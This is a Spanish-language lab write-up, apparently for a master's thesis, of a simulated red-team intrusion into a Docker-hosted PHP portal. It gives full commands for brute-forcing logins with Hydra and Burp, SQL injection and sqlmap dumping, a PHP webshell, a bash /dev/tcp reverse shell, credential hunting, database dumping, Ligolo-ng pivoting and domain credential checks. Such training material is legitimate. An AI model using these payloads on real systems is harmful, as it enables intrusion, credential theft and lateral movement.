# Writeup de explotación web del portal `portal_pyme`

## 1. Contexto del escenario

El laboratorio simula una intrusión Red Team contra una pequeña infraestructura empresarial.  
El punto de entrada inicial es un portal web vulnerable desplegado en Docker sobre un servidor Ubuntu.

## Datos del entorno

| Elemento | Valor |
|---|---|
| Máquina atacante | Kali Linux |
| Servidor web | Ubuntu Server |
| URL del portal | `http://192.168.1.216:8080/portal_pyme` |
| Contenedor web | `tfm_web` |
| Contenedor MySQL | `tfm_db` |
| Base de datos | `portal_pyme` |
| Red interna | `10.10.10.0/24` |
| DC01 | `10.10.10.5` |
| DEV01 | `10.10.10.20` |

---

# 2. Comprobación del servicio web

Desde Kali se verifica que el portal web responde correctamente.

```bash
curl -I http://192.168.1.216:8080/portal_pyme
```

También se puede abrir en el navegador:

```text
http://192.168.1.216:8080/portal_pyme
```

---

# 3. Enumeración inicial con Nmap

```bash
nmap -sV -sC -p 8080 192.168.1.216
```

Resultado esperado:

```text
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd
```

---

# 4. Enumeración de directorios

```bash
gobuster dir \
-u http://192.168.1.216:8080/portal_pyme \
-w /usr/share/wordlists/dirb/common.txt \
-x php,txt,html,bak
```

También puede usarse `feroxbuster`:

```bash
feroxbuster \
-u http://192.168.1.216:8080/portal_pyme \
-w /usr/share/wordlists/dirb/common.txt \
-x php,txt,html,bak
```

Posibles rutas de interés:

```text
/login.php
/index.php
/uploads/
/config/
/admin/
/assets/
```

---

# 5. Identificación del formulario de login

URL habitual:

```text
http://192.168.1.216:8080/portal_pyme/login.php
```

Inspección rápida:

```bash
curl -i http://192.168.1.216:8080/portal_pyme/login.php
```

Campos habituales:

```text
usuario
password
```

o:

```text
username
password
```

---

# 6. Prueba manual de login

Si los campos son `usuario` y `password`:

```bash
curl -i -X POST \
http://192.168.1.216:8080/portal_pyme/login.php \
-d "usuario=admin&password=admin"
```

Si los campos son `username` y `password`:

```bash
curl -i -X POST \
http://192.168.1.216:8080/portal_pyme/login.php \
-d "username=admin&password=admin"
```

Se debe observar la diferencia entre login válido e inválido:

- código HTTP,
- redirecciones,
- cookies de sesión,
- mensajes de error,
- tamaño de respuesta.

---

# 7. Preparación de diccionarios

## Diccionario de usuarios

```bash
cat > users.txt << 'EOF'
admin
administrator
dev
developer
victima
usuario
test
EOF
```

## Diccionario de contraseñas

```bash
cat > passwords.txt << 'EOF'
admin
admin123
password
Password123
Password123*
dev123
Dev123*
victima123
portal123
empresa123
EOF
```

---

# 8. Ataque de login con Hydra

Si el formulario usa `usuario` y `password`:

```bash
hydra -L users.txt -P passwords.txt \
192.168.1.216 \
-s 8080 \
http-post-form "/portal_pyme/login.php:usuario=^USER^&password=^PASS^:Credenciales incorrectas"
```

Si el formulario usa `username` y `password`:

```bash
hydra -L users.txt -P passwords.txt \
192.168.1.216 \
-s 8080 \
http-post-form "/portal_pyme/login.php:username=^USER^&password=^PASS^:Credenciales incorrectas"
```

La cadena final debe coincidir con el mensaje de error de la aplicación. Para identificarlo:

```bash
curl -s -X POST \
http://192.168.1.216:8080/portal_pyme/login.php \
-d "usuario=admin&password=incorrecta"
```

---

# 9. Ataque de login con Burp Suite

## 9.1 Configurar proxy

1. Abrir Burp Suite.
2. Ir a `Proxy → Proxy settings`.
3. Confirmar listener en:

```text
127.0.0.1:8080
```

4. Configurar el navegador con proxy HTTP:

```text
127.0.0.1:8080
```

5. Acceder al portal:

```text
http://192.168.1.216:8080/portal_pyme/login.php
```

---

## 9.2 Capturar petición de login

Activar:

```text
Proxy → Intercept → Intercept is on
```

Enviar un login de prueba:

```text
usuario=admin
password=admin
```

Burp capturará una petición similar:

```http
POST /portal_pyme/login.php HTTP/1.1
Host: 192.168.1.216:8080
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=...

usuario=admin&password=admin
```

Enviar a Intruder:

```text
Right click → Send to Intruder
```

---

## 9.3 Configurar Intruder

En `Intruder → Positions`, seleccionar usuario y contraseña:

```text
usuario=§admin§&password=§admin§
```

Tipo de ataque:

```text
Cluster bomb
```

---

## 9.4 Cargar diccionarios

En `Intruder → Payloads`:

Payload set 1:

```text
users.txt
```

Payload set 2:

```text
passwords.txt
```

Usuarios:

```text
admin
administrator
dev
developer
victima
usuario
test
```

Contraseñas:

```text
admin
admin123
password
Password123
Password123*
dev123
Dev123*
victima123
portal123
empresa123
```

---

## 9.5 Identificar credenciales válidas

Indicadores de autenticación correcta:

```text
HTTP 302
Location: dashboard.php
```

o:

```text
Panel de administración
```

o una respuesta con tamaño distinto al resto.

---

# 10. Prueba de SQL Injection en login

Payload básico:

```text
' OR '1'='1
```

Prueba con `curl`:

```bash
curl -i -X POST \
http://192.168.1.216:8080/portal_pyme/login.php \
-d "usuario=' OR '1'='1&password=test"
```

Otra variante:

```bash
curl -i -X POST \
http://192.168.1.216:8080/portal_pyme/login.php \
-d "usuario=admin'-- -&password=test"
```

---

# 11. Prueba con SQLMap

Capturar la petición de login con Burp y guardarla como `login.req`.

Ejecutar:

```bash
sqlmap -r login.req --batch --level=3 --risk=2
```

Enumerar bases:

```bash
sqlmap -r login.req --batch --dbs
```

Enumerar tablas:

```bash
sqlmap -r login.req --batch -D portal_pyme --tables
```

Volcar tabla:

```bash
sqlmap -r login.req --batch -D portal_pyme -T usuarios --dump
```

---

# 12. Prueba de subida de archivos

Archivo de prueba:

```bash
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

Subir `shell.php` desde el portal.

Comprobar acceso:

```text
http://192.168.1.216:8080/portal_pyme/uploads/shell.php
```

Probar ejecución:

```text
http://192.168.1.216:8080/portal_pyme/uploads/shell.php?cmd=id
```

Resultado esperado si es vulnerable:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

# 13. Obtención de reverse shell

En Kali:

```bash
nc -lvnp 4444
```

Desde la webshell:

```text
http://192.168.1.216:8080/portal_pyme/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/IP_KALI/4444 0>&1'
```

Payload alternativo:

```bash
bash -c "bash -i >& /dev/tcp/IP_KALI/4444 0>&1"
```

---

# 14. Tratamiento de TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Luego:

```text
Ctrl + Z
```

En Kali:

```bash
stty raw -echo; fg
```

Después:

```bash
export TERM=xterm
```

---

# 15. Enumeración local del servidor

```bash
whoami
id
uname -a
cat /etc/os-release
ip -c a
ip route
```

Resultado esperado:

```text
ens33 → 192.168.1.216/24
ens37 → 10.10.10.10/24
```

Esto evidencia una segunda interfaz hacia la red interna.

---

# 16. Búsqueda de credenciales

```bash
find /var/www -type f 2>/dev/null
find /opt -type f 2>/dev/null
find /home -type f 2>/dev/null
```

Buscar palabras clave:

```bash
grep -Ri "password" /var/www 2>/dev/null
grep -Ri "pass" /var/www 2>/dev/null
grep -Ri "user" /var/www 2>/dev/null
grep -Ri "DB_" /var/www 2>/dev/null
```

Buscar `.env`:

```bash
find / -name ".env" 2>/dev/null
```

Buscar backups:

```bash
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
find / -name "*.sql" 2>/dev/null
find / -name "*.zip" 2>/dev/null
```

---

# 17. Enumeración de Docker

```bash
groups
docker ps
sudo docker ps
```

Listar contenedores:

```bash
sudo docker ps
```

Resultado esperado:

```text
tfm_web
tfm_db
```

Entrar al contenedor web:

```bash
sudo docker exec -it tfm_web bash
```

Entrar a MySQL:

```bash
sudo docker exec -it tfm_db mysql -u root -p
```

---

# 18. Backup de base de datos

```bash
sudo docker exec tfm_db mysqldump -u root -p'root' portal_pyme > portal_backup.sql
```

Comprobar:

```bash
ls -lh portal_backup.sql
head portal_backup.sql
```

---

# 19. Descubrimiento de red interna

```bash
ping -c 1 10.10.10.5
ping -c 1 10.10.10.20
```

Barrido simple:

```bash
for i in $(seq 1 254); do ping -c 1 -W 1 10.10.10.$i | grep "bytes from"; done
```

Resultado esperado:

```text
10.10.10.5
10.10.10.10
10.10.10.20
```

---

# 20. Preparación de pivoting con Ligolo-ng

En Kali:

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

En Ubuntu comprometido:

```bash
./agent -connect IP_KALI:11601 -ignore-cert
```

En la consola del proxy:

```text
session
start
```

En Kali:

```bash
sudo ip route add 10.10.10.0/24 dev ligolo
```

---

# 21. Enumeración interna desde Kali

```bash
nmap -sn 10.10.10.0/24
nmap -sV --open 10.10.10.20
nmap -sV --open 10.10.10.5
```

---

# 22. Validación de credenciales de dominio

Credenciales encontradas:

```text
CORP\dev
Dev123*
```

Validar SMB:

```bash
nxc smb 10.10.10.20 -u dev -p 'Dev123*' -d corp.local
```

Resultado esperado:

```text
[+] CORP\dev:Dev123*
```

Acceso RDP:

```bash
xfreerdp /u:CORP\\dev /p:'Dev123*' /v:10.10.10.20 /cert:ignore /sec:rdp
```

---

# 23. Evidencias recomendadas para el TFM

1. Portal web accesible.
2. Nmap del puerto 8080.
3. Gobuster mostrando rutas.
4. Burp capturando login.
5. Burp Intruder con ataque de diccionario.
6. Login válido.
7. Webshell ejecutando `id`.
8. Reverse shell recibida en Kali.
9. `ip a` mostrando doble interfaz.
10. Descubrimiento de `10.10.10.0/24`.
11. Credenciales encontradas.
12. Ligolo activo.
13. Nmap interno.
14. Validación de `CORP\dev`.
15. Acceso a DEV01.

---

# 24. Conclusión

La fase web demuestra cómo una vulnerabilidad inicial en un portal corporativo expuesto puede permitir:

- acceso inicial al servidor,
- ejecución remota de comandos,
- obtención de reverse shell,
- enumeración de red interna,
- descubrimiento de credenciales,
- preparación de pivoting hacia Active Directory.

Esta fase representa el primer eslabón de la cadena de ataque y justifica la transición hacia la fase de post-explotación y compromiso del dominio.
